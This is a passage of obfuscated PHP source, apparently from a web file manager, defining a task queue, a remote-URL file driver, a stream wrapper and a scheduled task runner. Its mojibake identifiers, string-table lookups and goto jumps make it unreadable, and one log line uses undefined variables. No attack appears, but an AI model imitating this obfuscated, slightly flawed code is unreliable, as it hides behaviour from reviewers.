(self::count() >= self::MAX_LENGTH) { return !1; } $ëÂ ÖªĞ = self::getAll(); if ($¡¶  Íˆ && array_find_by_field($ëÂ ÖªĞ, $Ì®×¼‘‚[97], $¡¶  Íˆ)) { return !0; } $ëÂ ÖªĞ[] = array($Ì®×¼‘‚[344] => $¥”ú„—, $Ì®×¼‘‚[1884] => $‚Ä‡Èî, $Ì®×¼‘‚[529] => $ø«¡öçÚ, $Ì®×¼‘‚[97] => $¡¶  Íˆ); self::setAll($ëÂ ÖªĞ); write_log($Ì®×¼‘‚[1885] . $ø«¡öçÚ, $Ì®×¼‘‚[198]); return !0; } public static function run() { $Ó÷Ñ¤Í =& $_SERVER[«òÑğ]; $üÑÀÄ· = self::getAll(); $®êçßÎ„ = array_shift($üÑÀÄ·); if (!$®êçßÎ„) { return !1; } self::setAll($üÑÀÄ·); $Ø×ïó¬ = timeFloat(); $˜…½“İı = $Ó÷Ñ¤Í[12]; try { $˜…½“İı = Hook::apply($®êçßÎ„[$Ó÷Ñ¤Í[344]], $®êçßÎ„[$Ó÷Ñ¤Í[1884]]); } catch (Exception $âìÑÚçØ) { write_log($âìÑÚçØ, $Ó÷Ñ¤Í[1274]); } $ğ«ó„ô = number_format(timeFloat() - $Ø×ïó¬, 3) . $Ó÷Ñ¤Í[1800]; if ($˜…½“İı && is_string($˜…½“İı)) { $ğ«ó„ô = $ğ«ó„ô . $Ó÷Ñ¤Í[1886] . $˜…½“İı; } write_log($Ó÷Ñ¤Í[1887] . $®êçßÎ„[$Ó÷Ñ¤Í[529]] . $Ó÷Ñ¤Í[1888] . $ğ«ó„ô, $Ó÷Ñ¤Í[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $²‚‘èù =& $_SERVER[«òÑğ]; $ñ‡¡â†ş = self::threadCount() + 1; if ($ñ‡¡â†ş > 3 || !self::count()) { return; } write_log($²‚‘èù[1889] . $ñ‡¡â†ş, $²‚‘èù[198]); Cache::set(self::QUEUE_THREAD, $ñ‡¡â†ş, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($²‚‘èù[1890], $²‚‘èù[198]); } public static function getKey($˜»”»²Ù, $»é´¤Ü¾ = "\151\x6e\x74") { $õıòÊåş =& $_SERVER[«òÑğ]; Cache::removeMemory($˜»”»²Ù); $Ş™ïÌ‡ø = Cache::get($˜»”»²Ù); if ($»é´¤Ü¾ == $õıòÊåş[366]) { return $Ş™ïÌ‡ø ? intval($Ş™ïÌ‡ø) : 0; } if ($»é´¤Ü¾ == $õıòÊåş[1891]) { return is_array($Ş™ïÌ‡ø) ? $Ş™ïÌ‡ø : array(); } return $Ş™ïÌ‡ø; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[«òÑğ][1891]); } public static function setAll($ö¬Æ˜Æ) { $Ğô’›ÕÒ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ö¬Æ˜Æ), $Ğô’›ÕÒ); Cache::set(self::QUEUE_DATA, $ö¬Æ˜Æ, $Ğô’›ÕÒ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto D™³„¡ëø; c‘¡÷ª­¶¨: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($èĞÍªŸÍ = false) { } public function exist($âÚ†å™) { $„áºİª™ = $this->info($âÚ†å™); return $„áºİª™[$_SERVER[«òÑğ][235]]; } public function isFile($Ü×ÊÌ©) { $Ú“§Ú–¹ = $this->info($Ü×ÊÌ©); return $Ú“§Ú–¹[$_SERVER[«òÑğ][235]]; } public function isFolder($ÇŠ‰¶¬) { return !1; } public function size($Ïùô´Á) { $ÂÖïˆ‹Œ = $this->info($Ïùô´Á); return $ÂÖïˆ‹Œ[$_SERVER[«òÑğ][79]]; } public function info($ø½ŞóíŒ) { return $this->infoParse($ø½ŞóíŒ); } public function infoAuth($¨Úå¼©•) { return $this->infoParse($¨Úå¼©•); } public function infoWithChildren($¹ä‰Ë€º) { return $this->infoParse($¹ä‰Ë€º); } public function infoFull($‘’€Ìõ¿) { return $this->infoParse($‘’€Ìõ¿); } private function infoParse($‰Ş´º‹) { $šûÕí˜á =& $_SERVER[«òÑğ]; $îÌóÙôª = $this->header($‰Ş´º‹); if (!$îÌóÙôª || !$îÌóÙôª[$šûÕí˜á[834]]) { return !1; } $çºå¦•¡ = _get($îÌóÙôª, $šûÕí˜á[415], 0); $ê±ùÆÂë = array($šûÕí˜á[32] => $îÌóÙôª[$šûÕí˜á[32]], $šûÕí˜á[87] => $‰Ş´º‹, $šûÕí˜á[33] => $šûÕí˜á[233], $šûÕí˜á[79] => intval($çºå¦•¡), $šûÕí˜á[169] => get_path_ext($îÌóÙôª[$šûÕí˜á[32]]), $šûÕí˜á[1467] => $çºå¦•¡ > 0 && $îÌóÙôª[$šûÕí˜á[1617]], $šûÕí˜á[1468] => !1); return $ê±ùÆÂë; } private function header($Â€Å’½³) { $¡¢Å–×ì =& $_SERVER[«òÑğ]; if (isset(self::$_cacheHeader[$Â€Å’½³])) { return self::$_cacheHeader[$Â€Å’½³]; } $Ó„İô¼ª = isset($GLOBALS[$¡¢Å–×ì[1618]]) ? $GLOBALS[$¡¢Å–×ì[1618]] : !1; $GLOBALS[$¡¢Å–×ì[1618]] = !0; self::$_cacheHeader[$Â€Å’½³] = url_header($Â€Å’½³); $GLOBALS[$¡¢Å–×ì[1618]] = $Ó„İô¼ª; return self::$_cacheHeader[$Â€Å’½³]; } public function hashSimple($Ûé‹èŞÎ, $’å•¾ò  = false) { $“Ğü•·– =& $_SERVER[«òÑğ]; $Û¯§÷– = $this->info($Ûé‹èŞÎ); if (!$Û¯§÷– || !$Û¯§÷–[$“Ğü•·–[235]]) { return !1; } $èåîÙ¸ = $Û¯§÷–[$“Ğü•·–[79]]; $´»Ö‡æ = 200; $æÆˆñ³Ã = 50; if ($èåîÙ¸ <= $´»Ö‡æ * $æÆˆñ³Ã) { return md5($this->fileSubstr($Ûé‹èŞÎ, 0, $èåîÙ¸)) . $èåîÙ¸; } $©óˆà¨ğ = intval($èåîÙ¸ / $æÆˆñ³Ã); $éñ…Ô¾ = $“Ğü•·–[12]; $ŠÅŞ£’Ã = timeFloat(); $÷ÑçÉçú = 15; for ($Æç›É¢° = 0; $Æç›É¢° < $æÆˆñ³Ã; $Æç›É¢°++) { if (timeFloat() - $ŠÅŞ£’Ã > $÷ÑçÉçú) { return !1; } $Œú¶Å×Ó = $this->fileSubstr($Ûé‹èŞÎ, $©óˆà¨ğ * $Æç›É¢°, $´»Ö‡æ); if (!$Œú¶Å×Ó) { return !1; } $éñ…Ô¾ .= $Œú¶Å×Ó; } $éñ…Ô¾ .= $this->fileSubstr($Ûé‹èŞÎ, $èåîÙ¸ - $´»Ö‡æ, $´»Ö‡æ); return md5($éñ…Ô¾) . $èåîÙ¸; } public function getContent($Ê³ÅÆ–€) { return $this->fileSubstr($Ê³ÅÆ–€); } public function fileSubstr($ıÔª±×§, $¹¿ğñ’ = 0, $ÉÑô“Ó› = -1) { $»±„Àò =& $_SERVER[«òÑğ]; $Ëâ¨Ô = $this->info($ıÔª±×§); if (!$Ëâ¨Ô || !$Ëâ¨Ô[$»±„Àò[235]] && $Ëâ¨Ô[$»±„Àò[79]] > 1024 * 1024 * 10) { return !1; } if ($ÉÑô“Ó› === -1) { $ÉÑô“Ó› = $Ëâ¨Ô[$»±„Àò[79]]; } if ($ÉÑô“Ó› == 0) { return $»±„Àò[12]; } $ª›çØ»­ = array($»±„Àò[1619] . $¹¿ğñ’ . $»±„Àò[871] . ($¹¿ğñ’ + $ÉÑô“Ó› - 1)); $…³Öİ±¹ = url_request($ıÔª±×§, $»±„Àò[1507], !1, $ª›çØ»­, !1, !1, 30); return $…³Öİ±¹[$»±„Àò[1297]] ? $…³Öİ±¹[$»±„Àò[1297]] : $»±„Àò[12]; } public function download($¦¥šï›®, $¸¦Ñ”ÑÇ) { Downloader::start($¦¥šï›®, $¸¦Ñ”ÑÇ); return $¸¦Ñ”ÑÇ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($©ÑÍØı¦, $‹µäüß = '') { $this->info = $this->info($©ÑÍØı¦); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[«òÑğ][87]]; $this->pathOpen = $©ÑÍØı¦; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$©ÑÍØı¦])) { self::$_chunkBuffer[$©ÑÍØı¦] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($üİ·º¾ë) { $’¯ƒ‘Ê˜ = $this->fileSubstr($this->pose, $üİ·º¾ë); $this->pose += strlen($’¯ƒ‘Ê˜); return $’¯ƒ‘Ê˜; } public function stream_tell() { return $this->pose; } public function stream_seek($¢ø°Õó´, $é§©¡) { $çŒ¥’ı´ =& $_SERVER[«òÑğ]; if ($é§©¡ == SEEK_SET) { $this->pose = $¢ø°Õó´; } else { if ($é§©¡ == SEEK_CUR) { $this->pose += $¢ø°Õó´; } else { if ($é§©¡ == SEEK_END) { $this->pose = $this->info[$çŒ¥’ı´[79]] + intval($¢ø°Õó´); } } } if ($¢ø°Õó´ < 0) { $this->pose = $this->info[$çŒ¥’ı´[79]] + $¢ø°Õó´; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[«òÑğ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($º”ãÉ©, $ùê¸ôËœ) { $”Æ°ğá =& $_SERVER[«òÑğ]; $ëò à = $this->info($º”ãÉ©); return array($”Æ°ğá[1410] => 0, $”Æ°ğá[1620] => 0, $”Æ°ğá[16] => 32768 + 511, $”Æ°ğá[1621] => 0, $”Æ°ğá[1622] => 0, $”Æ°ğá[1623] => 0, $”Æ°ğá[1624] => 0, $”Æ°ğá[79] => $ëò à[$”Æ°ğá[79]], $”Æ°ğá[1625] => $ëò à[$”Æ°ğá[1466]], $”Æ°ğá[1582] => $ëò à[$”Æ°ğá[88]], $”Æ°ğá[1581] => $ëò à[$”Æ°ğá[234]], $”Æ°ğá[1626] => 0, $”Æ°ğá[1627] => 0); } static $fileInfo = array(); public function info($ÄùàÒú‚) { $—Ø«×ÓÛ = $_SERVER[«òÑğ][1628]; if (isset(self::$fileInfo[$ÄùàÒú‚])) { return self::$fileInfo[$ÄùàÒú‚]; } if (substr($ÄùàÒú‚, 0, strlen($—Ø«×ÓÛ)) != $—Ø«×ÓÛ) { return !1; } self::$fileInfo[$ÄùàÒú‚] = IO::info(substr($ÄùàÒú‚, strlen($—Ø«×ÓÛ))); return self::$fileInfo[$ÄùàÒú‚]; } public static function read($Àøåå³ı, $‘ÕÛÕÓ, $©ô“òù§) { if (!isset(self::$_fopenCache[$Àøåå³ı])) { $¯î“‚áñ = new StreamWrapperIO(); $¯î“‚áñ->stream_open($Àøåå³ı); self::$_fopenCache[$Àøåå³ı] = $¯î“‚áñ; } $¯î“‚áñ = self::$_fopenCache[$Àøåå³ı]; return $¯î“‚áñ->fileSubstr($‘ÕÛÕÓ, $©ô“òù§); } public static function _read($ÛˆÙ©—–, $Ü¶Şˆî¸, $ÏÑóÁ‡) { $Á‚ô†Í¬ =& $_SERVER[«òÑğ]; $¯Ğ¦ùä = fopen($ÛˆÙ©—–, $Á‚ô†Í¬[1470]); if (!$¯Ğ¦ùä) { return $Á‚ô†Í¬[12]; } $‘ôäàÑ = 8192; fseek($¯Ğ¦ùä, $Ü¶Şˆî¸, SEEK_SET); $ÈèË÷Ö = $Á‚ô†Í¬[12]; $Ô¬å…±æ = 0; while ($Ô¬å…±æ < $ÏÑóÁ‡) { $Òš‡††® = min($‘ôäàÑ, $ÏÑóÁ‡ - $Ô¬å…±æ); $ÈèË÷Ö .= fread($¯Ğ¦ùä, $Òš‡††®); $Ô¬å…±æ += $Òš‡††®; } fclose($¯Ğ¦ùä); return $ÈèË÷Ö; } public function fileSubstr($‡Ş¢ó«Ö, $–Ğ™‰Š®) { $¾ô…˜ =& $_SERVER[«òÑğ]; $¿Ñ©˜› = $this->info[$¾ô…˜[79]]; $¬‡·›“ñ = $‡Ş¢ó«Ö; $èÙÍÒ¿… = $–Ğ™‰Š®; if ($‡Ş¢ó«Ö < 0) { $‡Ş¢ó«Ö = $¿Ñ©˜› + $‡Ş¢ó«Ö; } if ($–Ğ™‰Š® === !1) { $–Ğ™‰Š® = $¿Ñ©˜› - $‡Ş¢ó«Ö; } if ($‡Ş¢ó«Ö + $–Ğ™‰Š® > $¿Ñ©˜›) { $–Ğ™‰Š® = $¿Ñ©˜› - $‡Ş¢ó«Ö; } if ($–Ğ™‰Š® <= 0) { return $¾ô…˜[12]; } if ($‡Ş¢ó«Ö < 0 || $‡Ş¢ó«Ö >= $¿Ñ©˜› || $–Ğ™‰Š® <= 0 || $–Ğ™‰Š® > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\145\122\x65\x61\x64\40\x65\x72\162\157\x72\41\40\163\164\141\x72\164\x3d{$‡Ş¢ó«Ö}\x3b\x6c\x65\156\x67\x74\150\x3d{$–Ğ™‰Š®}\73\40\163\151\x7a\145\x3d{$¿Ñ©˜›}\x3b"); } $µä˜×ö¸ = 64 * 1024; $æ×…¹§Î =& self::$_chunkBuffer[$this->path]; if (!$æ×…¹§Î) { $æ×…¹§Î = array(); } $ÏÛ ÀëÃ = 0; $áâ™ËÙÅ = 0; $éò‡†šî = $¾ô…˜[12]; foreach ($æ×…¹§Î as $ÏÛ ÀëÃ => $éò‡†šî) { $ÏÛ ÀëÃ = intval($ÏÛ ÀëÃ); $áâ™ËÙÅ = $ÏÛ ÀëÃ + strlen($éò‡†šî); if ($‡Ş¢ó«Ö >= $áâ™ËÙÅ) { continue; } if ($‡Ş¢ó«Ö >= $ÏÛ ÀëÃ && $‡Ş¢ó«Ö + $–Ğ™‰Š® <= $áâ™ËÙÅ) { return substr($éò‡†šî, $‡Ş¢ó«Ö - $ÏÛ ÀëÃ, $–Ğ™‰Š®); } break; } if (count($æ×…¹§Î) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¾ô…˜[1629], $¾ô…˜[1630] . count($æ×…¹§Î) . "\73\163\164\141\x72\x74\75{$‡Ş¢ó«Ö}\x2c\x6c\145\x6e\147\164\x68\x3d{$–Ğ™‰Š®}\x3b\x70\x6f\163\x65\x3a{$ÏÛ ÀëÃ}\x7e{$áâ™ËÙÅ}"); throw new Exception($¾ô…˜[1631]); } $Úãëá¿ñ = intval($‡Ş¢ó«Ö / $µä˜×ö¸) * $µä˜×ö¸; $“ÛÚ¾ = ceil(($‡Ş¢ó«Ö + $–Ğ™‰Š®) / $µä˜×ö¸) * $µä˜×ö¸ - $Úãëá¿ñ; $£Äø¦¬Œ = IO::fileSubstr($this->path, $Úãëá¿ñ, $“ÛÚ¾); $æ×…¹§Î[$Úãëá¿ñ . $¾ô…˜[12]] = $£Äø¦¬Œ; ksort($æ×…¹§Î); $°û¢Ç¹÷ = substr($£Äø¦¬Œ, $‡Ş¢ó«Ö - $Úãëá¿ñ, $–Ğ™‰Š®); return $°û¢Ç¹÷; } private function log($€×çÚ™®, $àıù£) { $×À§ÕÊ =& $_SERVER[«òÑğ]; $±µ…‡Şè = timeFloat() - $this->timeStart; write_log(sprintf($×À§ÕÊ[1632], $€×çÚ™®, $this->info[$×À§ÕÊ[32]], $±µ…‡Şè, $àıù£), $×À§ÕÊ[1274]); } } class Message { function __construct() { } public function send($ƒ ³Ò§§ = '', $ğš©Ö¯µ = array(), $ù˜ªëâŸ = "\x74\145\x78\164") { $ìöº£©Ø =& $_SERVER[«òÑğ]; $ú¼×À¸ñ = array($ìöº£©Ø[33] => $ìöº£©Ø[1223], $ìöº£©Ø[171] => $ƒ ³Ò§§); if (in_array($ù˜ªëâŸ, array($ìöº£©Ø[1223], $ìöº£©Ø[1633]))) { $ú¼×À¸ñ[$ìöº£©Ø[33]] = $ù˜ªëâŸ; } $ğš©Ö¯µ = array($ìöº£©Ø[583] => isset($ğš©Ö¯µ[$ìöº£©Ø[583]]) ? $ğš©Ö¯µ[$ìöº£©Ø[583]] : $ìöº£©Ø[12], $ìöº£©Ø[670] => isset($ğš©Ö¯µ[$ìöº£©Ø[670]]) ? $ğš©Ö¯µ[$ìöº£©Ø[670]] : $ìöº£©Ø[12]); if (empty($ƒ ³Ò§§) || empty($ğš©Ö¯µ[$ìöº£©Ø[583]]) && empty($ğš©Ö¯µ[$ìöº£©Ø[670]])) { return !1; } $ÅÄ­Ãò˜ = array($ìöº£©Ø[1562] => $ú¼×À¸ñ, $ìöº£©Ø[1634] => $ğš©Ö¯µ); Hook::trigger($ìöº£©Ø[1635], $ÅÄ­Ãò˜); } } goto aòà…¼¹¹ ; fñƒ‚ºÜÒ½: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¿ Ï©‰Ç =& $_SERVER[«òÑğ]; if (self::valueGet($¿ Ï©‰Ç[834]) != $¿ Ï©‰Ç[91]) { return; } if (self::valueGet($¿ Ï©‰Ç[1733]) == $¿ Ï©‰Ç[91]) { $Ù¡Ú’öÃ = self::valueGet($¿ Ï©‰Ç[1734]); if (time() - $Ù¡Ú’öÃ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¿ Ï©‰Ç[1733], $¿ Ï©‰Ç[91]); self::log($¿ Ï©‰Ç[1735] . ACTION . $¿ Ï©‰Ç[1736]); Hook::bind($¿ Ï©‰Ç[1737], $¿ Ï©‰Ç[1738]); $£ıÈ‡´· = 0; while (!0) { self::cacheClear(); if (self::valueGet($¿ Ï©‰Ç[834]) != $¿ Ï©‰Ç[91]) { self::valueSet($¿ Ï©‰Ç[1733], $¿ Ï©‰Ç[231]); self::log($¿ Ï©‰Ç[1739]); die; } $ïÙöõû = time(); if ($ïÙöõû - $£ıÈ‡´· >= 60) { self::valueSet(array($¿ Ï©‰Ç[1733] => $¿ Ï©‰Ç[91], $¿ Ï©‰Ç[1734] => $ïÙöõû)); $£ıÈ‡´· = $ïÙöõû; } if (!file_exists(USER_SYSTEM . $¿ Ï©‰Ç[1740])) { self::valueSet(array($¿ Ï©‰Ç[1733] => $¿ Ï©‰Ç[231], $¿ Ï©‰Ç[834] => $¿ Ï©‰Ç[231])); self::log($¿ Ï©‰Ç[1741]); die; } $ç¸ËÈÑ‡ = file_get_contents(BASIC_PATH . $¿ Ï©‰Ç[1742]); $±¡¢­À” = KOD_VERSION . $¿ Ï©‰Ç[10] . KOD_VERSION_BUILD; $ãµ¤®â¹ = match_text($ç¸ËÈÑ‡, $¿ Ï©‰Ç[1743]) . $¿ Ï©‰Ç[10] . match_text($ç¸ËÈÑ‡, $¿ Ï©‰Ç[1744]); if ($ãµ¤®â¹ != $±¡¢­À”) { self::restart(); self::log("\163\x74\157\160\x65\x64\56\133\166\x65\x72\163\x69\x6f\x6e\40\165\160\x64\141\164\x65\x3b{$versionNow}\x20\75\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ú¨×Òº  =& $_SERVER[«òÑğ]; http_close(); $GLOBALS[$Ú¨×Òº [1745]] = 1; $_SERVER[$Ú¨×Òº [1746]] = $Ú¨×Òº [1747]; $_COOKIE = array(); $GLOBALS[$Ú¨×Òº [1748]] = 1; $GLOBALS[$Ú¨×Òº [1749]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $à¯Áäù =& $_SERVER[«òÑğ]; http_close(); self::valueSet($à¯Áäù[834], $à¯Áäù[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($à¯Áäù[1733] => $à¯Áäù[231], $à¯Áäù[834] => $à¯Áäù[91])); self::log($à¯Áäù[1750]); } public static function taskSwitch() { $‰Æ…ó¦Ù =& $_SERVER[«òÑğ]; $³ÜúÏË = self::valueGet($‰Æ…ó¦Ù[834]) == $‰Æ…ó¦Ù[91] ? $‰Æ…ó¦Ù[231] : $‰Æ…ó¦Ù[91]; self::valueSet($‰Æ…ó¦Ù[834], $³ÜúÏË); } public static function shutdownEvent() { $µº²¦îĞ =& $_SERVER[«òÑğ]; self::valueSet($µº²¦îĞ[1733], $µº²¦îĞ[231]); self::log($µº²¦îĞ[1751]); } public static function config($µ•ãÑÑù, $Ä¾Ä¬û¢) { self::valueSet($_SERVER[«òÑğ][834], $µ•ãÑÑù); } private static function taskRunAll() { $Áµ‘Ê€¾ =& $_SERVER[«òÑğ]; $¨ïœäı = timeFloat(); $”°µ‰½ = Model($Áµ‘Ê€¾[1752])->listData(); $øºÖÛ¤ø = count($”°µ‰½); for ($¤î…€ÆŞ = 0; $¤î…€ÆŞ < $øºÖÛ¤ø; $¤î…€ÆŞ++) { $ØíŞ…±ˆ = $”°µ‰½[$¤î…€ÆŞ]; if (!$ØíŞ…±ˆ[$Áµ‘Ê€¾[478]] || $ØíŞ…±ˆ[$Áµ‘Ê€¾[1753]] != $Áµ‘Ê€¾[91]) { continue; } if (!self::taskTimeCheck($ØíŞ…±ˆ)) { continue; } self::taskRun($ØíŞ…±ˆ); } Hook::trigger($Áµ‘Ê€¾[1754]); self::taskQueueRun($¨ïœäı); } private static function taskQueueRun($ƒ×¬˜•) { $¦‹ËÍ„º = 10; while (!0) { $©Í»˜é¤ = TaskQueue::run(); if ($©Í»˜é¤ === !1) { break; } if (timeFloat() - $ƒ×¬˜• >= $¦‹ËÍ„º) { break; } } } private static function taskTimeCheck($„Ö†¹ğª) { $ÔÄÙŞıé =& $_SERVER[«òÑğ]; $Î©Ô˜İ = json_decode($„Ö†¹ğª[$ÔÄÙŞıé[207]], !0); $åóåİóÚ = intval($„Ö†¹ğª[$ÔÄÙŞıé[1734]]); $æ­Ùçóº = strtotime($ÔÄÙŞıé[1755] . $Î©Ô˜İ[$ÔÄÙŞıé[1756]] . $ÔÄÙŞıé[1757]) - strtotime($ÔÄÙŞıé[1758]); $âŠè‹½ = time() - strtotime(date($ÔÄÙŞıé[1759]) . $ÔÄÙŞıé[1760]); $Õ½Ş÷×ä = $âŠè‹½ >= $æ­Ùçóº && $âŠè‹½ <= $æ­Ùçóº + 3600; switch ($Î©Ô˜İ[$ÔÄÙŞıé[33]]) { case $ÔÄÙŞıé[1761]: if (time() - $åóåİóÚ < 3600 * 24 * 30) { return !1; } if ($Î©Ô˜İ[$ÔÄÙŞıé[1761]] == date($ÔÄÙŞıé[1762]) && $Õ½Ş÷×ä) { return !0; } break; case $ÔÄÙŞıé[1763]: if (time() - $åóåİóÚ < 3600 * 24 * 7) { return !1; } $ çØó±Ä = date($ÔÄÙŞıé[1764]) == 0 ? 7 : date($ÔÄÙŞıé[1764]); if ($Î©Ô˜İ[$ÔÄÙŞıé[1763]] == $ çØó±Ä && $Õ½Ş÷×ä) { return !0; } break; case $ÔÄÙŞıé[1756]: if (time() - $åóåİóÚ < 3600 * 24) { return !1; } if ($Õ½Ş÷×ä) { return !0; } break; case $ÔÄÙŞıé[1765]: if (time() - $åóåİóÚ >= floatval($Î©Ô˜İ[$ÔÄÙŞıé[1765]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $§Î‘´õü =& $_SERVER[«òÑğ]; static $¯§ú»¤ = 0; $›”¸¹âï = 300; if (!$¯§ú»¤) { $¯§ú»¤ = time(); } if (time() - $¯§ú»¤ < $›”¸¹âï) { return; } $¯§ú»¤ = time(); $ÍîÀ˜ı… = Model($§Î‘´õü[582])->db($§Î‘´õü[12]); if ($ÍîÀ˜ı…) { $ÍîÀ˜ı…->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($§Î‘´õü[1766], $§Î‘´õü[1767]); die; } } public static function taskRun($÷®»öË) { $­öüœÙÌ =& $_SERVER[«òÑğ]; self::log($­öüœÙÌ[1768] . $÷®»öË[$­öüœÙÌ[478]] . $­öüœÙÌ[1769] . $÷®»öË[$­öüœÙÌ[32]] . $­öüœÙÌ[1770] . $÷®»öË[$­öüœÙÌ[1771]]); Model($­öüœÙÌ[1752])->run($÷®»öË[$­öüœÙÌ[478]]); $¼Ğ»´Ê = timeFloat(); $ä´°”›æ = $­öüœÙÌ[12]; switch ($÷®»öË[$­öüœÙÌ[33]]) { case $­öüœÙÌ[385]: $ÎñÔßµÉ = url_request($÷®»öË[$­öüœÙÌ[1771]], $­öüœÙÌ[1507], !1, !1, !1, !1, 10); if ($ÎñÔßµÉ[$­öüœÙÌ[834]]) { $ä´°”›æ = strlen($ÎñÔßµÉ[$­öüœÙÌ[1297]]); } break; case $­öüœÙÌ[1772]: $ä´°”›æ = Hook::apply($÷®»öË[$­öüœÙÌ[1771]]); default: break; } Model($­öüœÙÌ[1773])->add(array($­öüœÙÌ[1774] => $­öüœÙÌ[12], $­öüœÙÌ[1775] => $­öüœÙÌ[231], $­öüœÙÌ[33] => $­öüœÙÌ[1776] . $÷®»öË[$­öüœÙÌ[478]], $­öüœÙÌ[1777] => json_encode(array($­öüœÙÌ[32] => $÷®»öË[$­öüœÙÌ[32]], $­öüœÙÌ[1778] => timeFloat() - $¼Ğ»´Ê, $­öüœÙÌ[371] => $ä´°”›æ)))); $¢øğõ = $ä´°”›æ ? $­öüœÙÌ[1779] . $ä´°”›æ : $­öüœÙÌ[12]; self::log($­öüœÙÌ[1780] . $÷®»öË[$­öüœÙÌ[478]] . $­öüœÙÌ[178] . $¢øğõ); return !0; } public static function valueGet($úÇ¸¿Ò) { $’³‹“Á¢ =& $_SERVER[«òÑğ]; $”ÉıíñŠ = $’³‹“Á¢[1781]; $î‡ÔÂùª = Model($’³‹“Á¢[511])->get($úÇ¸¿Ò, $”ÉıíñŠ); if (is_null($î‡ÔÂùª)) { Model($’³‹“Á¢[511])->set($’³‹“Á¢[834], $’³‹“Á¢[91], $”ÉıíñŠ); Model($’³‹“Á¢[511])->set($’³‹“Á¢[1733], $’³‹“Á¢[231], $”ÉıíñŠ); $î‡ÔÂùª = Model($’³‹“Á¢[511])->get($úÇ¸¿Ò, $”ÉıíñŠ); } return $î‡ÔÂùª; } private static function valueSet($æ¶íÂ, $ıƒì¹°¹ = false) { $ıˆ·îşğ =& $_SERVER[«òÑğ]; $ËÃ÷çÙø = $ıˆ·îşğ[1782]; CacheLock::lock($ËÃ÷çÙø); $¼İÖá—Š = Model($ıˆ·îşğ[511])->set($æ¶íÂ, $ıƒì¹°¹, $ıˆ·îşğ[1781]); CacheLock::unlock($ËÃ÷çÙø); return $¼İÖá—Š; } protected static function log($·²á´àù) { write_log($·²á´àù, $_SERVER[«òÑğ][1767]); } private static function cacheClear() { $´…Çí¹• =& $_SERVER[«òÑğ]; Cache::clearMemory(Model($´…Çí¹•[511])->cacheKey($´…Çí¹•[1781])); Cache::clearMemory(Model($´…Çí¹•[511])->cacheKey($´…Çí¹•[1783])); Model($´…Çí¹•[1752])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($³§şìşú, $Üˆ·° = '', $ŠÌ²ş¦ = 0, $É€Ÿ¨²Ì = '') { $×¡âã³é =& $_SERVER[«òÑğ]; if (self::get($³§şìşú)) { return; } $this->task = array($×¡âã³é[478] => $³§şìşú, $×¡âã³é[1784] => USER_ID, $×¡âã³é[1671] => $É€Ÿ¨²Ì, $×¡âã³é[529] => $×¡âã³é[12], $×¡âã³é[33] => $Üˆ·°, $×¡âã³é[1152] => $×¡âã³é[12], $×¡âã³é[1150] => $ŠÌ²ş¦, $×¡âã³é[1785] => 0, $×¡âã³é[1786] => 0, $×¡âã³é[1787] => 0, $×¡âã³é[1788] => timeFloat(), $×¡âã³é[1789] => 0, $×¡âã³é[1790] => 0, $×¡âã³é[1791] => 0, $×¡âã³é[1792] => 0, $×¡âã³é[834] => $×¡âã³é[1733]); $GLOBALS[$×¡âã³é[1793]] = 1; Hook::bind($×¡âã³é[1737], array($this, $×¡âã³é[1794])); Hook::bind($×¡âã³é[1795], array($this, $×¡âã³é[1796])); $this->startAfter(); Hook::trigger($×¡âã³é[1797], $this->task); $this->task[$×¡âã³é[1790]] = timeFloat(); } public function end($ñôªø‡Ã = '') { $Şäûá…ë =& $_SERVER[«òÑğ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Şäûá…ë[1790]]) { self::valueSet($this->task[$Şäûá…ë[478]], !1); } $this->isEnd = !0; if ($ñôªø‡Ã) { $this->task[$Şäûá…ë[529]] = $ñôªø‡Ã; } self::log($Şäûá…ë[1798] . $this->task[$Şäûá…ë[478]] . $Şäûá…ë[1799] . sprintf($Şäûá…ë[941], timeFloat() - $this->task[$Şäûá…ë[1788]]) . $Şäûá…ë[1800]); Hook::unbind($Şäûá…ë[1737], array($this, $Şäûá…ë[1794])); Hook::unbind($Şäûá…ë[1795], array($this, $Şäûá…ë[1796])); $this->endAfter(); $×¦Î–å = $this->task; $this->task = !1; Hook::trigger($Şäûá…ë[1801], $×¦Î–å); } public function 